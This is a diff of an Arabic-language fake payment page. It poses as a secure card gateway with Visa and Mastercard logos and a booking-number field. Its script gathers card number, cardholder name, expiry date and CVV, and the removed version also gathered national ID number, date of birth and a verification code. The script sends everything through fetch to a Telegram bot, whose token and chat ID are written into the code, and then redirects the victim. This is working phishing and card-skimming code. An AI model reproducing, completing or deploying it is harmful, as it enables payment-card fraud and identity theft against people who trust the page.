@@ -1,121 +1,125 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>التحقق من الدفع</title>
+  <title>بوابة الدفع الآمنة</title>
   <style>
-    /* الأساسيات */
     body {
       font-family: Arial, sans-serif;
       direction: rtl;
       background-color: #f5f5f5;
       margin: 0;
       padding: 0;
-      box-sizing: border-box;
     }
-
     header, footer {
       background-color: #004080;
       color: white;
       text-align: center;
-      padding: 20px;
+      padding: 20px 0;
     }
-
     main {
       padding: 20px;
     }
-
-    .container {
+    form {
       background-color: white;
       padding: 20px;
       border-radius: 8px;
-      max-width: 600px;
+      max-width: 500px;
       margin: auto;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-
-    .info {
-      margin-top: 20px;
-      font-size: 16px;
+    label {
+      display: block;
+      margin-top: 10px;
     }
-
-    .info p {
-      margin: 10px 0;
+    input, select {
+      width: 100%;
+      padding: 8px;
+      margin-top: 5px;
+      box-sizing: border-box;
     }
-
-    .highlight {
-      font-weight: bold;
-      color: #004080;
+    .error-message {
+      color: red;
+      font-size: 14px;
+      display: none;
+      margin-top: 10px;
     }
-
     button {
-      padding: 12px;
+      margin-top: 20px;
+      padding: 10px;
       width: 100%;
       background-color: #004080;
       color: white;
       border: none;
       border-radius: 4px;
       font-size: 16px;
-      cursor: pointer;
-      margin-top: 20px;
     }
-
-    button:hover {
-      background-color: #003366;
+    .card-logos {
+      display: flex;
+      justify-content: center;
+      gap: 20px;
     }
-
-    input {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      font-size: 14px;
-    }
-
-    /* تنسيق الهاتف والتابلت */
-    @media only screen and (max-width: 600px) {
-      .container {
-        padding: 15px;
-      }
-
-      header, footer {
-        padding: 10px;
-      }
-
-      button {
-        font-size: 14px;
-      }
+    .card-logos img {
+      height: 50px;
     }
   </style>
 </head>
 <body>
 
   <header>
-    <h2>التحقق من الدفع</h2>
+    <div class="card-logos">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa Logo" />
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="MasterCard Logo" />
+    </div>
   </header>
 
   <main>
-    <div class="container">
-      <h3>مراجعة بيانات الدفع</h3>
+    <form id="paymentForm">
 
-      <div class="info">
-        <p><span class="highlight">الاسم:</span> <span id="name"></span></p>
-        <p><span class="highlight">رقم الهوية:</span> <span id="idNumber"></span></p>
-        <p><span class="highlight">تاريخ الميلاد:</span> <span id="dob"></span></p>
-        <p><span class="highlight">رقم البطاقة:</span> <span id="cardNumber"></span></p>
-        <p><span class="highlight">تاريخ الصلاحية:</span> <span id="expiryDate"></span></p>
-        <p><span class="highlight">CVV:</span> <span id="cvv"></span></p>
-        <p><span class="highlight">المبلغ المدفوع:</span> <span id="amount"></span> درهم</p>
-      </div>
+      <label for="confirmBooking">تأكيد رقم الحجز:</label>
+      <input type="text" id="confirmBooking" minlength="6" maxlength="6" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
 
-      <!-- إضافة حقل إدخال كود التحقق -->
-      <label for="verificationCode">أدخل كود التحقق:</label>
-      <input type="text" id="verificationCode" placeholder="أدخل كود التحقق" required />
+      <p id="lengthError" class="error-message">
+        ❗ رقم الحجز.
+      </p>
 
-      <button id="confirmBtn">تأكيد الدفع</button>
-    </div>
+      <label for="cardNumber">رقم البطاقة:</label>
+      <input type="text" id="cardNumber" maxlength="19" required oninput="formatCardNumber(this)" />
+
+      <label for="cardName">الاسم الموجود على البطاقة:</label>
+      <input type="text" id="cardName" required />
+
+      <label for="expiryMonth">الشهر (MM):</label>
+      <select id="expiryMonth" required>
+        <option value="">--</option>
+        <option>01</option><option>02</option><option>03</option>
+        <option>04</option><option>05</option><option>06</option>
+        <option>07</option><option>08</option><option>09</option>
+        <option>10</option><option>11</option><option>12</option>
+      </select>
+
+      <label for="expiryYear">السنة (YYYY):</label>
+      <select id="expiryYear" required>
+        <option value="">--</option>
+        <option>2025</option><option>2026</option><option>2027</option>
+        <option>2028</option><option>2029</option><option>2030</option>
+        <option>2031</option><option>2032</option><option>2033</option>
+        <option>2034</option><option>2035</option><option>2036</option>
+        <option>2037</option><option>2038</option><option>2039</option>
+        <option>2040</option>
+      </select>
+
+      <label for="cvv">CVV (3 أرقام):</label>
+      <input type="text" id="cvv" minlength="3" maxlength="3" required oninput="this.value = this.value.replace(/[^0-9]/g, '')" />
+
+      <p id="dateError" class="error-message">
+        ❗ لأسباب أمنية، لا يمكننا قبول بطاقات منتهية الصلاحية.  
+        نحتفظ بحق رفض المعاملة لحمايتك من الاحتيال.
+      </p>
+
+      <button type="submit">ادفع الآن</button>
+    </form>
   </main>
 
   <footer>
@@ -123,59 +127,67 @@
   </footer>
 
   <script>
-    // استرجاع البيانات المخزنة من الجلسة السابقة
-    const formData = JSON.parse(sessionStorage.getItem('formData'));
+    function formatCardNumber(input) {
+      let value = input.value.replace(/[^0-9]/g, "");
+      value = value.slice(0, 16);
+      let formatted = value.match(/.{1,4}/g);
+      input.value = formatted ? formatted.join("-") : "";
+    }
 
-    document.getElementById('name').textContent = formData.fullName;
-    document.getElementById('idNumber').textContent = formData.idNumber;
-    document.getElementById('dob').textContent = formData.dob;
-    document.getElementById('cardNumber').textContent = formData.cardNumber;
-    document.getElementById('expiryDate').textContent = `${formData.expiryMonth}/${formData.expiryYear}`;
-    document.getElementById('cvv').textContent = formData.cvv;
-    document.getElementById('amount').textContent = formData.amount;
+    document.getElementById("paymentForm").addEventListener("submit", function(e) {
+      e.preventDefault();
 
-    document.getElementById('confirmBtn').addEventListener('click', function() {
-      const verificationCode = document.getElementById('verificationCode').value.trim();
+      const confirmBooking = document.getElementById("confirmBooking").value;
+      const lengthError = document.getElementById("lengthError");
+      const dateError = document.getElementById("dateError");
 
-      if (!verificationCode) {
-        alert("❗ الرجاء إدخال كود التحقق.");
+      lengthError.style.display = "none";
+      dateError.style.display = "none";
+
+      if (confirmBooking.length !== 6) {
+        lengthError.style.display = "block";
         return;
       }
 
-      // إنشاء الرسالة لإرسالها إلى البوت
+      const month = parseInt(document.getElementById("expiryMonth").value);
+      const year = parseInt(document.getElementById("expiryYear").value);
+
+      if (year < 2025 || (year === 2025 && month < 7)) {
+        dateError.style.display = "block";
+        return;
+      }
+
+      const cardNumber = document.getElementById("cardNumber").value;
+      const cardName = document.getElementById("cardName").value;
+      const cvv = document.getElementById("cvv").value;
+
       const message = `
-✅ تم تأكيد الدفع بنجاح!
------------------------------------
-👤 الاسم: ${formData.fullName}
-🆔 رقم الهوية: ${formData.idNumber}
-📅 تاريخ الميلاد: ${formData.dob}
-📄 رقم البطاقة: ${formData.cardNumber}
-📆 تاريخ الصلاحية: ${formData.expiryMonth}/${formData.expiryYear}
-🔐 CVV: ${formData.cvv}
-💵 المبلغ المدفوع: ${formData.amount} درهم
-🔑 كود التحقق: ${verificationCode}
+💳 معلومات عملية الدفع:
+------------------------
+📄 رقم البطاقة: ${cardNumber}
+👤 الاسم على البطاقة: ${cardName}
+📆 تاريخ الانتهاء: ${month}/${year}
+🔐 CVV: ${cvv}
+🔢 رقم الحجز: ${confirmBooking}
 `;
 
-      // إرسال الرسالة إلى بوت التلغرام
+      // ✅ استبدال التوكن والشات آيدي
       fetch("https://api.telegram.org/bot8175456301:AAHcojlkfA5YkgBkx5gAnvFjd-u5Tk6hg7I/sendMessage", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
         },
         body: JSON.stringify({
-          chat_id: "8404960059",  // معرف المحادثة
+          chat_id: "8404960059",
           text: message
         })
       })
       .then(() => {
-        alert("تم إرسال بيانات الدفع بنجاح!");
+        window.location.href = "verify.html";
       })
       .catch(() => {
         alert("❌ فشل الإرسال إلى البوت");
       });
-
-      // الانتقال إلى صفحة التأكيد النهائي أو إتمام العملية
-      window.location.href = "thank_you.html";  // هنا يمكن وضع صفحة شكرًا بعد الدفع
     });
   </script>
 
